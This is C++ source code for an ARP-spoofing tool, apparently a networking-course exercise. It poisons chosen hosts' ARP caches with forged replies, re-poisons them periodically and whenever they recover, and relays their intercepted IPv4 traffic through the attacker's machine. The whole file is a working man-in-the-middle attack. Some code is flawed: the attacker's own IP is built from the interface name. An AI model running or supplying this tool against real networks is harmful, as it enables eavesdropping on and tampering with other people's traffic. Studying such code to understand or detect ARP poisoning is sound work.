#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <string.h>
#include <thread>
#include <chrono>
#include <atomic>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip sender_ip;
    Ip target_ip;
    Mac sender_mac;
    Mac target_mac;
};

std::vector<Flow> flows;
std::atomic<bool> should_stop(false);

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip get_target_ip(const char* dev) {
    FILE* fp = fopen("/proc/net/route", "r");
    if (!fp) {
        perror("Failed to open /proc/net/route");
        return Ip("0.0.0.0");
    }

    char line[256];
    char iface[16];
    unsigned long dest, target;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%15s %lx %lx", iface, &dest, &target) == 3) {
            if (strcmp(iface, dev) == 0 && dest == 0) {
                fclose(fp);
                return Ip(ntohl(target));
            }
        }
    }

    fclose(fp);
    return Ip("0.0.0.0");
}

Mac get_sender_mac(pcap_t* handle, Ip sender_ip, Mac my_mac, Ip my_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac("00:00:00:00:00:00");
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* eth_arp = (EthArpPacket*)packet;
        if (eth_arp->eth_.type_ == htons(EthHdr::Arp) &&
            eth_arp->arp_.op_ == htons(ArpHdr::Reply) &&
            Ip(ntohl(eth_arp->arp_.sip_)) == sender_ip) {
            return eth_arp->arp_.smac_;
        }
    }

    return Mac("00:00:00:00:00:00");
}

void send_arp(pcap_t* handle, Mac sender_mac, Mac target_mac, uint16_t op, Mac smac, Ip sip, Mac tmac, Ip tip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = sender_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void send_arp_spoof(pcap_t* handle, const Flow& flow, Mac attacker_mac) {
    send_arp(handle, attacker_mac, flow.sender_mac, ArpHdr::Reply, attacker_mac, flow.target_ip, flow.sender_mac, flow.sender_ip);
}

void periodic_arp_spoof(pcap_t* handle, Mac attacker_mac) {
    while (!should_stop) {
        for (const auto& flow : flows) {
            send_arp_spoof(handle, flow, attacker_mac);
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void relay_packet(pcap_t* handle, const u_char* packet, int packet_len, Mac attacker_mac) {
    EthHdr* eth_hdr = (EthHdr*)packet;
    
    for (const auto& flow : flows) {
        if (eth_hdr->smac_ == flow.sender_mac && eth_hdr->dmac_ == attacker_mac) {
            eth_hdr->smac_ = attacker_mac;
            eth_hdr->dmac_ = flow.target_mac;
            
            int res = pcap_sendpacket(handle, packet, packet_len);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            break;
        }
    }
}

void packet_handler(pcap_t* handle, Mac attacker_mac) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (!should_stop) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* eth_hdr = (EthHdr*)packet;
        if (eth_hdr->type() == EthHdr::Arp) {
            ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
            if (arp_hdr->op() == ArpHdr::Reply) {
                for (auto& flow : flows) {
                    if (arp_hdr->sip() == flow.target_ip && arp_hdr->tip() == flow.sender_ip) {
                        // ARP recover detected, re-infect
                        send_arp_spoof(handle, flow, attacker_mac);
                        break;
                    }
                }
            }
        } else if (eth_hdr->type() == EthHdr::Ip4) {
            relay_packet(handle, packet, header->caplen, attacker_mac);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attacker_mac = get_my_mac(dev);
    printf("Attacker MAC: %s\n", std::string(attacker_mac).c_str());

    Ip target_ip = get_target_ip(dev);
    printf("target IP: %s\n", std::string(target_ip).c_str());

    for (int i = 2; i < argc; i += 2) {
        Flow flow;
        flow.sender_ip = Ip(argv[i]);
        flow.target_ip = Ip(argv[i+1]);
        flow.sender_mac = get_sender_mac(handle, flow.sender_ip, attacker_mac, Ip(dev));
        flow.target_mac = get_sender_mac(handle, flow.target_ip, attacker_mac, Ip(dev));

        if (flow.sender_mac == Mac::nullMac() || flow.target_mac == Mac::nullMac()) {
            fprintf(stderr, "Failed to get MAC address for %s or %s\n", std::string(flow.sender_ip).c_str(), std::string(flow.target_ip).c_str());
            continue;
        }

        flows.push_back(flow);
        printf("Flow: Sender IP: %s, MAC: %s | Target IP: %s, MAC: %s\n",
               std::string(flow.sender_ip).c_str(), std::string(flow.sender_mac).c_str(),
               std::string(flow.target_ip).c_str(), std::string(flow.target_mac).c_str());

        send_arp_spoof(handle, flow, attacker_mac);
    }

    std::thread spoof_thread(periodic_arp_spoof, handle, attacker_mac);
    std::thread packet_thread(packet_handler, handle, attacker_mac);

    printf("ARP spoofing and packet relaying started. Press Enter to stop...\n");
    getchar();

    should_stop = true;
    spoof_thread.join();
    packet_thread.join();

    pcap_close(handle);
    return 0;
}